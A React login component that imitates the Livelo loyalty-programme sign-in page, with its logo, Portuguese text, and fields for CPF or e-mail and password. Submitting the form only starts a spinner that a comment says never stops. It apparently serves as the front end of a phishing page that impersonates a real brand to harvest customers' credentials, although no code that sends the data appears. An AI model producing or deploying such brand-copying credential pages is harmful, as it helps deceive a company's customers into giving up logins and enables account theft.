import { useState, useEffect } from "react";
import "@/App.css";

function App() {
  const [credential, setCredential] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isValid, setIsValid] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  // Validação de CPF (11 dígitos) ou Email
  const validateCredential = (value) => {
    const cpfRegex = /^\d{11}$/;
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return cpfRegex.test(value) || emailRegex.test(value);
  };

  // Verifica se o formulário está válido
  useEffect(() => {
    const credentialValid = validateCredential(credential);
    const passwordValid = password.length > 0;
    setIsValid(credentialValid && passwordValid);
  }, [credential, password]);

  // Formatar CPF enquanto digita (adiciona pontos e hífen)
  const formatCPF = (value) => {
    const numbers = value.replace(/\D/g, "");
    if (numbers.length <= 11) {
      return numbers;
    }
    return numbers.slice(0, 11);
  };

  const handleCredentialChange = (e) => {
    const value = e.target.value;
    // Se contém apenas números, formata como CPF
    if (/^\d*$/.test(value)) {
      setCredential(formatCPF(value));
    } else {
      setCredential(value);
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (isValid) {
      setIsLoading(true);
      // Loading infinito - não para nunca
    }
  };

  return (
    <div className="App min-h-screen bg-white flex flex-col">
      <div className="flex-1 flex flex-col items-center justify-center px-4">
        {/* Logo */}
        <div className="mb-8">
          <img 
            src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
            alt="Livelo Logo" 
            className="h-12 w-auto"
          />
        </div>

        {/* Título */}
        <h2 className="text-2xl font-bold text-gray-800 mb-8">
          Entre com sua conta Livelo
        </h2>

        {/* Formulário */}
        <form onSubmit={handleSubmit} className="w-full max-w-md space-y-4">
          {/* Campo CPF ou E-mail */}
          <div className="relative">
            <div className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-5 w-5"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"
                />
              </svg>
            </div>
            <input
              type="text"
              value={credential}
              onChange={handleCredentialChange}
              placeholder="CPF ou E-mail"
              className="w-full pl-12 pr-4 py-4 border-2 border-gray-200 rounded-lg focus:outline-none focus:border-pink-500 transition-colors"
              data-testid="credential-input"
            />
          </div>

          {/* Campo Senha */}
          <div className="relative">
            <div className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-5 w-5"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                />
              </svg>
            </div>
            <input
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Senha"
              className="w-full pl-12 pr-12 py-4 border-2 border-gray-200 rounded-lg focus:outline-none focus:border-pink-500 transition-colors"
              data-testid="password-input"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors"
              data-testid="toggle-password-visibility"
            >
              {showPassword ? (
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-5 w-5"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"
                  />
                </svg>
              ) : (
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-5 w-5"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                  />
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                  />
                </svg>
              )}
            </button>
          </div>

          {/* Link Esqueceu a senha */}
          <div className="text-left">
            <a
              href="#"
              className="text-pink-500 hover:text-pink-600 font-medium text-sm transition-colors"
              data-testid="forgot-password-link"
            >
              Esqueceu sua senha?
            </a>
          </div>

          {/* Botão Entrar */}
          <button
            type="submit"
            disabled={!isValid || isLoading}
            className={`w-full py-4 rounded-full font-semibold text-lg transition-all duration-300 ${
              isValid && !isLoading
                ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-lg hover:shadow-xl transform hover:scale-105"
                : "bg-gray-200 text-gray-400 cursor-not-allowed"
            }`}
            data-testid="login-button"
          >
            {isLoading ? (
              <div className="flex items-center justify-center">
                <svg
                  className="animate-spin h-6 w-6 text-white"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                  data-testid="loading-spinner"
                >
                  <circle
                    className="opacity-25"
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    strokeWidth="4"
                  ></circle>
                  <path
                    className="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                  ></path>
                </svg>
                <span className="ml-3">Carregando...</span>
              </div>
            ) : (
              "Entrar"
            )}
          </button>
        </form>

        {/* Criar conta */}
        <div className="mt-8 text-center">
          <p className="text-gray-600 mb-2">Ainda não tem conta?</p>
          <a
            href="#"
            className="text-pink-500 hover:text-pink-600 font-semibold transition-colors"
            data-testid="create-account-link"
          >
            Crie sua conta Livelo
          </a>
        </div>
      </div>

      {/* Voltar para página inicial */}
      <div className="p-8">
        <a
          href="#"
          className="flex items-center text-gray-600 hover:text-gray-800 transition-colors"
          data-testid="back-to-home-link"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-5 w-5 mr-2"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M15 19l-7-7 7-7"
            />
          </svg>
          Voltar para página inicial
        </a>
      </div>
    </div>
  );
}

export default App;